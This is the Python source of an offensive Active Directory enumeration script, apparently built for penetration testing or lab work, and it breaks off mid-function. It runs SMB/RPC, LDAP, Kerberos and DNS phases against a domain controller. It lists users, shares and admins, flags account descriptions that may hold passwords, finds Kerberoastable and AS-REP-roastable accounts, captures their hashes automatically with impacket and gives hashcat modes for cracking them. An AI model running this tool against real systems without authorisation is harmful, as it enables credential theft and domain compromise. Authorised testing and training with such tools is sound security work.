#!/usr/bin/env python3
"""
ad_enum.py — Active Directory Enumeration (Multi-Phase)

Usage:
  ./ad_enum.py -i <IP> [OPTIONS]

Required:
  -i / --ip       Target DC IP address

Optional:
  -u / --user     Username          (default: null session)
  -p / --pass     Password          (default: empty)
  -d / --domain   Domain FQDN       (e.g. corp.local — needed for LDAP/Kerberos)
  --phase         smb | ldap | kerberos | dns | all  (default: all)

Examples:
  ./ad_enum.py -i 10.10.10.1
  ./ad_enum.py -i 10.10.10.1 -u administrator -p 'P@ss123' -d corp.local
  ./ad_enum.py -i 10.10.10.1 -u user -p 'pass' -d corp.local --phase ldap
"""

import argparse
import re
import shutil
import subprocess
import sys
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

# ── tabulate is stdlib-adjacent; always on Kali ──────────────
try:
    from tabulate import tabulate
    HAS_TABULATE = True
except ImportError:
    HAS_TABULATE = False

# ─────────────────────────────────────────────────────────────
#  ANSI COLOURS
# ─────────────────────────────────────────────────────────────
class C:
    RED    = "\033[0;31m"
    GREEN  = "\033[0;32m"
    YELLOW = "\033[1;33m"
    CYAN   = "\033[0;36m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

    @staticmethod
    def red(s):    return f"{C.RED}{s}{C.RESET}"
    @staticmethod
    def green(s):  return f"{C.GREEN}{s}{C.RESET}"
    @staticmethod
    def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
    @staticmethod
    def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
    @staticmethod
    def bold(s):   return f"{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def dim(s):    return f"{C.DIM}{s}{C.RESET}"

# ─────────────────────────────────────────────────────────────
#  SHARED STATE — passed between phases so they can share data
# ─────────────────────────────────────────────────────────────
@dataclass
class EnumState:
    ip:       str
    username: str = ""
    password: str = ""
    domain:   str = ""
    phase:    str = "all"
    logfile:  str = ""

    # Counters
    user_count:     int = 0
    group_count:    int = 0
    share_count:    int = 0
    sid_count:      int = 0
    priv_count:     int = 0
    spn_count:      int = 0
    asrep_count:    int = 0
    dns_host_count: int = 0

    # Cross-phase data (LDAP → Kerberos)
    kerberoastable: list = field(default_factory=list)   # [{"user": ..., "spn": ...}]
    asreproastable: list = field(default_factory=list)   # ["user1", "user2"]

    # Findings accumulator
    findings: list = field(default_factory=list)

    @property
    def session_type(self) -> str:
        return f"Authenticated ({self.username})" if self.username else "Null Session (Anonymous)"

    @property
    def base_dn(self) -> str:
        if not self.domain:
            return ""
        return ",".join(f"DC={part}" for part in self.domain.split("."))

    def add_finding(self, msg: str):
        self.findings.append(msg)

# ─────────────────────────────────────────────────────────────
#  OUTPUT / LOGGING
# ─────────────────────────────────────────────────────────────
_logfile: Optional[str] = None

def _strip_ansi(text: str) -> str:
    return re.sub(r"\033\[[0-9;]*m", "", text)

def log(msg: str = ""):
    """Print to stdout and append (ANSI-stripped) to log file."""
    print(msg)
    if _logfile:
        with open(_logfile, "a") as f:
            f.write(_strip_ansi(msg) + "\n")

def banner(title: str):
    line = "─" * 60
    log()
    log(C.cyan(C.bold(f"┌{line}┐")))
    log(C.cyan(C.bold(f"│  {title}")))
    log(C.cyan(C.bold(f"└{line}┘")))

def sub(title: str):
    log()
    log(C.dim(f"  ▸ {title}"))

def info(msg: str):  log(f"  {C.dim(msg)}")
def ok(msg: str):    log(f"  {C.green('[+]')} {msg}")
def warn(msg: str):  log(f"  {C.yellow('[!]')} {msg}")
def err(msg: str):   log(f"  {C.red('[!]')} {msg}")
def skip(tool: str): log(f"  {C.yellow('[skip]')} '{tool}' not found — install it to enable this check.")
def hint(msg: str):  log(f"  {C.dim(f'     {msg}')}")

def print_table(headers: list[str], rows: list[list], fallback: str = "[no results]"):
    """Render a table using tabulate if available, plain grid otherwise."""
    if not rows:
        log(C.yellow(f"  {fallback}"))
        return
    if HAS_TABULATE:
        table = tabulate(rows, headers=headers, tablefmt="simple_outline")
        for line in table.splitlines():
            log(f"  {line}")
    else:
        # Manual fixed-width fallback
        col_widths = [len(h) for h in headers]
        for row in rows:
            for i, cell in enumerate(row):
                col_widths[i] = max(col_widths[i], len(str(cell)))
        sep = "  +" + "+".join("-" * (w + 2) for w in col_widths) + "+"
        def fmt_row(cells):
            return "  |" + "|".join(f" {str(c):<{col_widths[i]}} " for i, c in enumerate(cells)) + "|"
        log(sep)
        log(fmt_row(headers))
        log(sep)
        for row in rows:
            log(fmt_row(row))
        log(sep)

# ─────────────────────────────────────────────────────────────
#  TOOL RUNNER
# ─────────────────────────────────────────────────────────────
def tool_exists(name: str) -> bool:
    return shutil.which(name) is not None

def run(cmd: list[str], timeout: int = 30) -> str:
    """
    Run a command, return stdout as string.
    Never raises — returns empty string on any failure.
    stderr is always suppressed (tool noise).
    """
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.stdout or ""
    except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
        return ""
    except Exception:
        return ""

# ─────────────────────────────────────────────────────────────
#  RPC HELPERS
# ─────────────────────────────────────────────────────────────
def rpc_auth_args(s: EnumState) -> list[str]:
    """
    Build rpcclient auth argument list.

    Key rule: --no-pass must NOT be present when a password is supplied.
    rpcclient honours --no-pass over the -U password field and silently
    authenticates anonymously, causing all RPC calls to fail with creds.

    Format: -U 'DOMAIN\\user%password' for domain auth. Backslash form is
    more reliable across Samba versions than user@domain.
    """
    if not s.username:
        # Null / anonymous session
        return ["-U", "%", "--no-pass"]
    elif not s.password:
        # Username but no password — need --no-pass to suppress interactive prompt
        user = f"{s.domain}\\{s.username}" if s.domain else s.username
        return ["-U", f"{user}%", "--no-pass"]
    else:
        # Fully authenticated — NO --no-pass flag, it overrides the password
        user = f"{s.domain}\\{s.username}" if s.domain else s.username
        return ["-U", f"{user}%{s.password}"]

def rpc(s: EnumState, command: str) -> str:
    """Run a single rpcclient command non-interactively."""
    if not tool_exists("rpcclient"):
        return ""
    cmd = ["rpcclient"] + rpc_auth_args(s) + [s.ip, "-c", command]
    return run(cmd, timeout=15)

def parse_kv(text: str) -> list[tuple[str, str]]:
    """
    Parse colon-separated key:value lines into a list of (key, value) tuples.
    Handles multi-colon values (e.g. timestamps, SIDs).
    """
    results = []
    for line in text.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        key, _, val = line.partition(":")
        key = key.strip()
        val = val.strip()
        if key:
            results.append((key, val))
    return results

# ─────────────────────────────────────────────────────────────
#  LDAP HELPERS
# ─────────────────────────────────────────────────────────────
def ldap_auth_args(s: EnumState) -> list[str]:
    if s.username and s.password:
        bind_dn = f"{s.username}@{s.domain}" if s.domain else s.username
        return ["-D", bind_dn, "-w", s.password]
    return ["-x"]   # anonymous

def ldap_run(s: EnumState, ldap_filter: str, attrs: str = "") -> str:
    """Run ldapsearch against the target."""
    if not tool_exists("ldapsearch"):
        return ""
    cmd = (
        ["ldapsearch"]
        + ldap_auth_args(s)
        + ["-H", f"ldap://{s.ip}", "-b", s.base_dn, ldap_filter]
    )
    if attrs:
        cmd += attrs.split()
    return run(cmd, timeout=30)

def parse_ldap_records(text: str, wanted_attrs: list[str]) -> list[dict]:
    """
    Parse ldapsearch output into a list of dicts, one per DN block.
    Only collects attributes listed in wanted_attrs (case-insensitive).
    Handles multi-value attributes by keeping the last occurrence (sufficient for enum).
    """
    records: list[dict] = []
    current: dict = {}
    wanted_lower = {a.lower() for a in wanted_attrs}

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if line.lower().startswith("dn:"):
            if current:
                records.append(current)
            current = {}
            continue
        if ":" in line:
            key, _, val = line.partition(":")
            key = key.strip()
            val = val.strip()
            # Skip base64-encoded values (::)
            if key.endswith(":"):
                continue
            if key.lower() in wanted_lower:
                current[key.lower()] = val

    if current:
        records.append(current)

    return [r for r in records if r]  # drop empty records


# ─────────────────────────────────────────────────────────────
#  FINDINGS FILTER HELPERS
# ─────────────────────────────────────────────────────────────

# Built-in descriptions that are never interesting as credential hints
_BUILTIN_DESCRIPTIONS = {
    "built-in account for administering the computer/domain",
    "built-in account for guest access to the computer/domain",
    "key distribution center service account",
    "managed service account",
}

def _is_interesting_description(desc: str) -> bool:
    """
    Return True only if a description looks like it might contain
    credentials or non-default information worth flagging.
    Filters out: empty, (null), and known built-in description strings.
    """
    if not desc:
        return False
    cleaned = desc.strip().lower()
    if cleaned in ("(null)", "null", "", "-"):
        return False
    if cleaned in _BUILTIN_DESCRIPTIONS:
        return False
    # Descriptions that are just the username repeated are also noise
    return True

# Well-known built-in group names that always have adminCount=1 —
# flagging these as findings is pure noise.
_BUILTIN_ADMIN_GROUPS = {
    "administrators", "print operators", "backup operators", "replicator",
    "domain controllers", "schema admins", "enterprise admins", "domain admins",
    "server operators", "account operators", "read-only domain controllers",
    "enterprise read-only domain controllers", "key admins", "enterprise key admins",
    "group policy creator owners", "krbtgt",
}

def _is_notable_admincnt(sam: str, dn: str) -> bool:
    """
    Return True if an adminCount=1 object is actually interesting —
    i.e. it's a user account, not a built-in group or service account.
    Machine accounts (ending $) and well-known group names are excluded.
    """
    if sam.endswith("$"):
        return False
    if sam.lower() in _BUILTIN_ADMIN_GROUPS:
        return False
    # If the DN contains CN=Builtin it's a built-in container object
    if "CN=Builtin" in dn:
        return False
    return True

# ═════════════════════════════════════════════════════════════
#  PHASE: SMB / RPC
# ═════════════════════════════════════════════════════════════
def phase_smb(s: EnumState):
    banner("SMB / RPC PHASE")

    # ── netexec / crackmapexec — SMB signing ──────────────────
    sub("SMB connectivity and signing")
    nxc = next((t for t in ("netexec", "crackmapexec") if tool_exists(t)), None)
    if nxc:
        cmd = [nxc, "smb", s.ip]
        if s.username and s.password:
            cmd += ["-u", s.username, "-p", s.password]
        out = run(cmd, timeout=20)
        if out:
            for line in out.splitlines():
                log(f"  {line}")
                if re.search(r"signing:False", line):  # case-sensitive — True/False are literals
                    s.add_finding("SMB Signing DISABLED — NTLM relay attacks viable")
                if re.search(r"\[\+\].*guest", line, re.I):
                    s.add_finding("Guest/anonymous SMB access confirmed")
        else:
            warn("No output from SMB probe — host may be down or port 445 filtered.")
    else:
        skip("netexec / crackmapexec")
        hint("apt install netexec  or  pip3 install crackmapexec")

    # ── rpcclient ─────────────────────────────────────────────
    if not tool_exists("rpcclient"):
        skip("rpcclient")
        hint("apt install samba-client")
        return

    # Server info
    sub("Server information (srvinfo)")
    out = rpc(s, "srvinfo")
    if not out:
        err("srvinfo failed — check credentials and that port 445 is reachable.")
    else:
        kvs = parse_kv(out)
        if kvs:
            print_table(["Field", "Value"], [[k, v] for k, v in kvs])

    # Domain info block
    sub("Domain information")
    for cmd_str in ("querydominfo", "enumdomains", "lsaquery", "dsroledominfo"):
        info(f"→ {cmd_str}")
        out = rpc(s, cmd_str)
        if out:
            kvs = parse_kv(out)
            if kvs:
                print_table(["Field", "Value"], [[k, v] for k, v in kvs])
        else:
            warn(f"{cmd_str} returned no output.")

    # Users
    sub("Domain users (enumdomusers + querydispinfo)")
    info("→ enumdomusers")
    out = rpc(s, "enumdomusers")
    user_rows = []
    if out:
        for line in out.splitlines():
            uname = re.search(r"user:\[(.+?)\]", line)
            rid   = re.search(r"rid:\[(.+?)\]",  line)
            if uname:
                # rpcclient outputs rid:[0x1f4] — already contains 0x prefix
                raw_rid = rid.group(1) if rid else ""
                user_rows.append([uname.group(1), raw_rid])
        s.user_count = len(user_rows)
        print_table(["Username", "RID (hex)"], user_rows)
        ok(f"Found {s.user_count} domain users")

    info("→ querydispinfo")
    out = rpc(s, "querydispinfo")
    if out:
        disp_rows = []
        # querydispinfo emits one record per line: index:N Account:X Name:Y Desc:Z
        for line in out.splitlines():
            line = line.strip()
            if not line:
                continue
            idx   = re.search(r"index:\s*(\S+)",    line)
            acct  = re.search(r"Account:\s*(\S+)",  line)
            name  = re.search(r"Name:\s*(.*?)\s+Desc:", line)
            desc  = re.search(r"Desc:\s*(.*)",       line)
            if acct:
                row_desc = desc.group(1).strip() if desc else ""
                disp_rows.append([
                    idx.group(1)  if idx  else "",
                    acct.group(1),
                    name.group(1).strip() if name else "",
                    row_desc,
                ])
                if _is_interesting_description(row_desc):
                    s.add_finding(f"Creds in description — '{acct.group(1)}': {row_desc}")
        if disp_rows:
            print_table(["Index", "Account", "Full Name", "Description"], disp_rows)

    # Groups
    sub("Domain groups")
    info("→ enumdomgroups")
    out = rpc(s, "enumdomgroups")
    if out:
        grp_rows = []
        for line in out.splitlines():
            gname = re.search(r"group:\[(.+?)\]", line)
            rid   = re.search(r"rid:\[(.+?)\]",   line)
            if gname:
                raw_rid = rid.group(1) if rid else ""
                grp_rows.append([gname.group(1), raw_rid])
        s.group_count = len(grp_rows)
        print_table(["Group Name", "RID (hex)"], grp_rows)
        ok(f"Found {s.group_count} domain groups")

    info("→ enumalsgroups builtin")
    out = rpc(s, "enumalsgroups builtin")
    if out:
        alias_rows = []
        for line in out.splitlines():
            gname = re.search(r"group:\[(.+?)\]", line)
            rid   = re.search(r"rid:\[(.+?)\]",   line)
            if gname:
                raw_rid = rid.group(1) if rid else ""
                alias_rows.append([gname.group(1), raw_rid])
        print_table(["Builtin Alias", "RID (hex)"], alias_rows)

    info("→ querygroupmem 0x200 (Domain Admins)")
    out = rpc(s, "querygroupmem 0x200")
    if out:
        da_rows = []
        for line in out.splitlines():
            rid  = re.search(r"rid:\[(.+?)\]",  line)
            attr = re.search(r"attr:\[(.+?)\]", line)
            if rid:
                raw_rid = rid.group(1)  # already contains 0x prefix from rpcclient
                da_rows.append([raw_rid, attr.group(1) if attr else ""])
                s.add_finding(f"Domain Admin member — RID: {raw_rid}")
        print_table(["Member RID", "Attributes"], da_rows)
    else:
        warn("Could not enumerate Domain Admins (RID 0x200).")

    # Password policy
    sub("Password policy (getdompwinfo)")
    out = rpc(s, "getdompwinfo")
    if out:
        kvs = parse_kv(out)
        print_table(["Field", "Value"], [[k, v] for k, v in kvs])
        text_lower = out.lower()
        if re.search(r"min.?length.*:\s*[0-5]\b", text_lower):
            s.add_finding(f"Weak minimum password length in domain policy")
        if re.search(r"complexity.*\b0\b|complexity.*(none|false)", text_lower):
            s.add_finding("No password complexity enforced")

    # Privileges
    sub("Session privileges (enumprivs)")
    out = rpc(s, "enumprivs")
    if out:
        privs = re.findall(r"Se\w+", out)
        s.priv_count = len(privs)
        print_table(["Privilege Name"], [[p] for p in privs])
        ok(f"{s.priv_count} privileges in current session")
        dangerous = {
            "SeDebugPrivilege", "SeImpersonatePrivilege", "SeTakeOwnershipPrivilege",
            "SeLoadDriverPrivilege", "SeBackupPrivilege", "SeRestorePrivilege",
        }
        for p in privs:
            if p in dangerous:
                s.add_finding(f"Dangerous privilege held: {p}")

    # Shares
    sub("Network shares (netshareenumall)")
    out = rpc(s, "netshareenumall")
    if out:
        share_rows = []
        cur_share = cur_type = cur_remark = ""
        for line in out.splitlines():
            line = line.strip()
            m = re.search(r"netname:\s*(.+)", line)
            if m:
                cur_share = m.group(1).strip().strip("\\")
            m = re.search(r"type:\s*(.+)", line)
            if m:
                cur_type = m.group(1).strip()
            m = re.search(r"remark:\s*(.*)", line)
            if m:
                cur_remark = m.group(1).strip().strip("\\")
                share_rows.append([cur_share, cur_type, cur_remark])
                cur_share = cur_type = cur_remark = ""
        s.share_count = len(share_rows)
        print_table(["Share Name", "Type", "Comment"], share_rows)
        ok(f"Found {s.share_count} shares")
        standard = {"ADMIN$", "C$", "IPC$", "SYSVOL", "NETLOGON", "print$"}
        for row in share_rows:
            if row[0] not in standard:
                s.add_finding(f"Non-standard share: {row[0]}")
    else:
        warn("netshareenumall returned no output.")

    # SID / LSA
    sub("SID enumeration (lsaenumsid)")
    out = rpc(s, "lsaenumsid")
    if out:
        sids = re.findall(r"S-\d+-[\d-]+", out)
        s.sid_count = len(sids)
        print_table(["SID"], [[sid] for sid in sids])
        ok(f"Enumerated {s.sid_count} SIDs from LSA")

    if s.domain:
        sub(f"Domain SID lookup (lookupdomain {s.domain})")
        out = rpc(s, f"lookupdomain {s.domain}")
        if out:
            kvs = parse_kv(out)
            print_table(["Field", "Value"], [[k, v] for k, v in kvs])

# ═════════════════════════════════════════════════════════════
#  PHASE: LDAP
# ═════════════════════════════════════════════════════════════
def phase_ldap(s: EnumState):
    banner("LDAP PHASE")

    if not tool_exists("ldapsearch"):
        skip("ldapsearch")
        hint("apt install ldap-utils")
        return

    if s.username and s.password:
        bind = f"{s.username}@{s.domain}" if s.domain else s.username
        ok(f"LDAP: authenticated as {bind}")
    else:
        warn("LDAP: attempting anonymous bind")

    # ── RootDSE ───────────────────────────────────────────────
    sub("RootDSE — DC capabilities and naming contexts")
    rootdse_cmd = [
        "ldapsearch", "-x",
        "-H", f"ldap://{s.ip}",
        "-s", "base", "-b", "",
    ]
    rootdse = run(rootdse_cmd, timeout=15)
    inferred_base = ""
    if rootdse:
        interesting = {
            "defaultnamingcontext", "dnsdomainname", "dnshostname",
            "domainfunctionality", "forestfunctionality",
            "domaincontrollerfunctionality", "servername", "ldapservicename",
        }
        rows = []
        for line in rootdse.splitlines():
            if ":" not in line or line.startswith("#"):
                continue
            key, _, val = line.partition(":")
            key = key.strip(); val = val.strip()
            if key.lower() in interesting:
                rows.append([key, val])
            if key.lower() == "defaultnamingcontext" and not s.base_dn:
                inferred_base = val
        print_table(["Attribute", "Value"], rows)
        if inferred_base and not s.base_dn:
            ok(f"Inferred base DN: {inferred_base}")
    else:
        warn("RootDSE query failed — LDAP may be filtered (port 389).")
        return

    # Use inferred base DN if we have it and domain wasn't provided
    effective_base = s.base_dn or inferred_base
    if not effective_base:
        err("Cannot determine base DN — provide -d <domain>")
        return

    # Temporarily patch base_dn for ldap_run calls if we inferred it
    original_domain = s.domain
    if not s.domain and inferred_base:
        s.domain = inferred_base  # ldap_run uses s.base_dn which reads s.domain

    # ── All users ─────────────────────────────────────────────
    sub("All domain users (objectClass=user)")
    out = ldap_run(s, "(objectClass=user)",
                   "sAMAccountName cn description userAccountControl")
    if out:
        records = parse_ldap_records(out, ["sAMAccountName", "cn", "description", "userAccountControl"])
        rows = []
        for r in records:
            sam  = r.get("samaccountname", "")
            cn   = r.get("cn", "")
            desc = r.get("description", "")
            uac  = r.get("useraccountcontrol", "")
            if sam:
                rows.append([sam, cn, uac, desc])
                if _is_interesting_description(desc):
                    s.add_finding(f"Creds in description — '{sam}': {desc}")
                # 66048 = NORMAL_ACCOUNT|DONT_EXPIRE_PASSWORD
                # Only flag non-machine, non-krbtgt accounts (machine accounts end in $)
                if uac in ("66048", "66080") and not sam.endswith("$") and sam.lower() != "krbtgt":
                    s.add_finding(f"Password never expires — '{sam}' (UAC={uac})")
        print_table(["sAMAccountName", "CN", "UAC", "Description"], rows)
        ok(f"Found {len(rows)} user objects via LDAP")

    # ── Kerberoastable ────────────────────────────────────────
    sub("Kerberoastable accounts — servicePrincipalName=*")
    out = ldap_run(s, "(&(objectClass=user)(servicePrincipalName=*))",
                   "sAMAccountName servicePrincipalName")
    if out:
        records = parse_ldap_records(out, ["sAMAccountName", "servicePrincipalName"])
        rows = []
        for r in records:
            sam = r.get("samaccountname", "")
            spn = r.get("serviceprincipalname", "")
            if sam:
                rows.append([sam, spn])
                s.kerberoastable.append({"user": sam, "spn": spn})
                if sam.endswith("$"):
                    # Machine accounts have 120-char random passwords — not crackable
                    s.add_finding(f"KERBEROASTABLE (machine acct — skip): {sam} — SPN: {spn}")
                else:
                    s.add_finding(f"KERBEROASTABLE (crack me): {sam} — SPN: {spn}")
        s.spn_count = len(rows)
        if rows:
            print_table(["Account", "SPN"], rows)
            ok(f"{s.spn_count} Kerberoastable account(s) found")
        else:
            info("No Kerberoastable accounts found.")

    # ── AS-REP Roastable ─────────────────────────────────────
    sub("AS-REP Roastable — DONT_REQ_PREAUTH (UAC 0x400000 / 4194304)")
    asrep_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    out = ldap_run(s, asrep_filter, "sAMAccountName")
    if out:
        records = parse_ldap_records(out, ["sAMAccountName"])
        rows = []
        for r in records:
            sam = r.get("samaccountname", "")
            if sam:
                rows.append([sam])
                s.asreproastable.append(sam)
                s.add_finding(f"AS-REP ROASTABLE: {sam} — no Kerberos pre-auth required")
        s.asrep_count = len(rows)
        if rows:
            print_table(["Account (AS-REP Roastable)"], rows)
            log(f"  {C.red(f'[!] {s.asrep_count} AS-REP roastable account(s) — crack with: hashcat -m 18200')}")
        else:
            info("No AS-REP roastable accounts found.")

    # ── AdminCount=1 ──────────────────────────────────────────
    sub("High-value accounts (adminCount=1)")
    out = ldap_run(s, "(adminCount=1)", "sAMAccountName distinguishedName")
    if out:
        records = parse_ldap_records(out, ["sAMAccountName", "distinguishedname"])
        rows = []
        for r in records:
            sam = r.get("samaccountname", "")
            dn  = r.get("distinguishedname", "")
            if sam:
                rows.append([sam, dn])
                # Only flag as a finding if it's a user account, not a well-known
                # built-in group (Administrators, Print Operators, Replicator, etc.)
                if _is_notable_admincnt(sam, dn):
                    s.add_finding(f"AdminCount=1 user account (privileged group member): {sam}")
        if rows:
            print_table(["Account", "Distinguished Name"], rows)

    # ── Domain groups ─────────────────────────────────────────
    sub("Domain groups (objectClass=group)")
    out = ldap_run(s, "(objectClass=group)", "sAMAccountName cn")
    if out:
        records = parse_ldap_records(out, ["sAMAccountName", "cn"])
        rows = [[r.get("samaccountname", ""), r.get("cn", "")] for r in records
                if r.get("samaccountname")]
        print_table(["sAMAccountName", "CN"], rows)

    # ── Password policy ───────────────────────────────────────
    sub("Domain password policy (objectClass=domain)")
    out = ldap_run(s, "(objectClass=domain)",
                   "minPwdLength maxPwdAge minPwdAge pwdHistoryLength lockoutThreshold pwdProperties")
    if out:
        attrs_of_interest = [
            "minPwdLength", "maxPwdAge", "minPwdAge",
            "pwdHistoryLength", "lockoutThreshold", "pwdProperties",
        ]
        rows = []
        for attr in attrs_of_interest:
            match = re.search(rf"^{attr}:\s*(.+)", out, re.MULTILINE | re.IGNORECASE)
            if match:
                rows.append([attr, match.group(1).strip()])
        if rows:
            print_table(["Policy Attribute", "Value"], rows)

    # Restore domain if we patched it
    s.domain = original_domain

# ═════════════════════════════════════════════════════════════
#  PHASE: KERBEROS
# ═════════════════════════════════════════════════════════════
def phase_kerberos(s: EnumState):
    banner("KERBEROS PHASE")

    if not s.domain:
        warn("Kerberos phase requires -d <domain>. Skipping.")
        return

    # ── kerbrute hint ─────────────────────────────────────────
    sub("Username enumeration via Kerberos (kerbrute)")
    if tool_exists("kerbrute"):
        info("kerbrute found — requires a wordlist, run manually:")
        hint(f"kerbrute userenum -d {s.domain} --dc {s.ip} "
             "/usr/share/seclists/Usernames/Names/names.txt")
    else:
        skip("kerbrute")
        hint("https://github.com/ropnop/kerbrute/releases")

    # ── AS-REP Roasting ───────────────────────────────────────
    sub("AS-REP Roasting (impacket-GetNPUsers)")
    npusers = next(
        (t for t in ("impacket-GetNPUsers", "GetNPUsers.py") if tool_exists(t)),
        None
    )
    if npusers:
        if s.asreproastable:
            ok(f"Targeting {len(s.asreproastable)} AS-REP roastable account(s) from LDAP phase...")
            for user in s.asreproastable:
                info(f"→ {npusers} {s.domain}/{user} -no-pass -dc-ip {s.ip}")
                out = run([npusers, f"{s.domain}/{user}", "-no-pass", "-dc-ip", s.ip], timeout=20)
                if "$krb5asrep$" in out:
                    log(C.red(f"  [!] AS-REP hash captured for {user}:"))
                    for line in out.splitlines():
                        if "$krb5asrep$" in line:
                            log(f"  {line}")
                    s.add_finding(f"AS-REP hash captured for '{user}' — hashcat -m 18200")
        else:
            info("No AS-REP candidates from LDAP phase.")
            hint(f"Run --phase ldap first, or manually:")
            hint(f"{npusers} {s.domain}/ -no-pass -dc-ip {s.ip} -usersfile users.txt")
    else:
        skip("impacket-GetNPUsers")
        hint("pip3 install impacket  or  apt install python3-impacket")
        hint(f"Manual: GetNPUsers.py {s.domain}/ -usersfile users.txt -no-pass -dc-ip {s.ip}")

    # ── Kerberoasting ─────────────────────────────────────────
    sub("Kerberoasting — TGS ticket request (impacket-GetUserSPNs)")
    if not (s.username and s.password):
        warn("Kerberoasting requires credentials (-u and -p).")
        hint(f"Manual: impacket-GetUserSPNs {s.domain}/<user>:<pass> -dc-ip {s.ip} -request")
    else:
        spns_tool = next(
            (t for t in ("impacket-GetUserSPNs", "GetUserSPNs.py") if tool_exists(t)),
            None
        )
        if spns_tool:
            if s.kerberoastable:
                ok(f"Requesting TGS tickets for {len(s.kerberoastable)} SPN account(s)...")
                info(f"→ {spns_tool} {s.domain}/{s.username}:<pass> -dc-ip {s.ip} -request")
                out = run(
                    [spns_tool, f"{s.domain}/{s.username}:{s.password}",
                     "-dc-ip", s.ip, "-request"],
                    timeout=30
                )
                if out:
                    for line in out.splitlines():
                        if "$krb5tgs$" in line:
                            log(C.red("  [!] TGS hash captured — hashcat -m 13100:"))
                            log(f"  {line}")
                            s.add_finding("TGS (Kerberoast) hash captured — hashcat -m 13100")
            else:
                info("No SPN accounts from LDAP phase.")
                hint(f"Run --phase ldap first, or manually:")
                hint(f"{spns_tool} {s.domain}/{s.username}:<pass> -dc-ip {s.ip} -request")
        else:
            skip("impacket-GetUserSPNs")
            hint("pip3 install impacket  or  apt install python3-impacket")

    # ── Roasting summary ──────────────────────────────────────
    if s.kerberoastable or s.asreproastable:
        sub("Roasting targets summary")
        rows = []
        for entry in s.kerberoastable:
            rows.append([entry["user"], "Kerberoastable (TGS)", entry["spn"]])
        for user in s.asreproastable:
            rows.append([user, "AS-REP Roastable", "N/A"])
        print_table(["Account", "Attack Type", "SPN"], rows)

# ═════════════════════════════════════════════════════════════
#  PHASE: DNS
# ═════════════════════════════════════════════════════════════
def phase_dns(s: EnumState):
    banner("DNS PHASE")

    dig_ok      = tool_exists("dig")
    nmap_ok     = tool_exists("nmap")
    nslookup_ok = tool_exists("nslookup")

    if not any([dig_ok, nmap_ok, nslookup_ok]):
        warn("No DNS tools found (dig, nslookup, nmap).")
        hint("apt install dnsutils nmap")
        return

    # ── PTR / reverse lookup ──────────────────────────────────
    sub(f"Reverse DNS lookup (PTR) for {s.ip}")
    if dig_ok:
        # Try against DC first (authoritative), then default resolver
        ptr = (run(["dig", "+short", "-x", s.ip, f"@{s.ip}"], timeout=10).strip() or
               run(["dig", "+short", "-x", s.ip], timeout=10).strip())
        if ptr:
            ok(f"PTR: {ptr}")
            if not s.domain:
                # Try to infer domain from PTR (strip host, keep domain)
                parts = ptr.rstrip(".").split(".")
                if len(parts) >= 2:
                    inferred = ".".join(parts[1:])
                    warn(f"Possible domain from PTR: {inferred} (confirm with -d)")
        else:
            info("No PTR record returned.")
    elif nslookup_ok:
        out = run(["nslookup", s.ip, s.ip], timeout=10)
        if out:
            for line in out.splitlines():
                log(f"  {line}")

    # ── Zone transfer ─────────────────────────────────────────
    sub("Zone transfer attempt (AXFR)")
    if not s.domain:
        warn("No domain (-d) provided — skipping zone transfer.")
    elif dig_ok:
        info(f"→ dig AXFR {s.domain} @{s.ip}")
        axfr = run(["dig", "AXFR", s.domain, f"@{s.ip}"], timeout=20)
        refused_pattern = re.compile(
            r"transfer failed|timed out|refused|servfail|xfr size", re.I
        )
        if refused_pattern.search(axfr):
            info("Zone transfer refused (expected on hardened DCs).")
        elif axfr.strip():
            log(C.red("  [!] Zone transfer SUCCEEDED — full zone exposed:"))
            s.add_finding(f"DNS zone transfer allowed — full zone for {s.domain} exposed")
            count = 0
            for line in axfr.splitlines():
                if line.strip() and not line.startswith(";"):
                    log(f"  {line}")
                    count += 1
            s.dns_host_count = count
        else:
            info("No AXFR response.")
    else:
        skip("dig")

    # ── Common AD SRV records ─────────────────────────────────
    sub("Common AD DNS / SRV records")
    if dig_ok and s.domain:
        queries = [
            f"_ldap._tcp.{s.domain}",
            f"_kerberos._tcp.{s.domain}",
            f"_kpasswd._tcp.{s.domain}",
            f"_gc._tcp.{s.domain}",
            f"domaindnszones.{s.domain}",
            f"forestdnszones.{s.domain}",
        ]
        rows = []
        for q in queries:
            ans = run(["dig", "+short", q, f"@{s.ip}"], timeout=8).strip()
            if ans:
                rows.append([q, ans])
        if rows:
            print_table(["Record", "Answer"], rows)
        else:
            info("No SRV records returned.")
    elif not s.domain:
        warn("No domain (-d) — skipping SRV record queries.")

    # ── nmap DNS scripts ──────────────────────────────────────
    sub("DNS service fingerprint (nmap)")
    if nmap_ok:
        info(f"→ nmap -sV -p 53 --script dns-nsid,dns-recursion {s.ip}")
        out = run(
            ["nmap", "-sV", "-p", "53",
             "--script", "dns-nsid,dns-recursion", s.ip],
            timeout=30
        )
        if out:
            for line in out.splitlines():
                log(f"  {line}")
                if re.search(r"recursion.*enabled", line, re.I):
                    s.add_finding("DNS recursion enabled on DC")
    else:
        skip("nmap")

# ─────────────────────────────────────────────────────────────
#  HEADER + SUMMARY
# ─────────────────────────────────────────────────────────────
def print_header(s: EnumState):
    log(C.green(C.bold("")))
    log(C.green(C.bold("  ╔══════════════════════════════════════════════════════════╗")))
    log(C.green(C.bold("  ║         AD Enumeration Script — Multi-Phase              ║")))
    log(C.green(C.bold("  ╚══════════════════════════════════════════════════════════╝")))
    log()
    log(f"  {C.bold('Target      :')} {s.ip}")
    log(f"  {C.bold('Session     :')} {s.session_type}")
    if s.domain:
        log(f"  {C.bold('Domain      :')} {s.domain}")
    log(f"  {C.bold('Phase(s)    :')} {s.phase}")
    log(f"  {C.bold('Log file    :')} {s.logfile}")
    log(f"  {C.bold('Started     :')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log()
    if not s.domain and s.phase in ("ldap", "kerberos", "all"):
        warn("No domain (-d) provided — LDAP and Kerberos phases will be limited.")

def print_summary(s: EnumState):
    log()
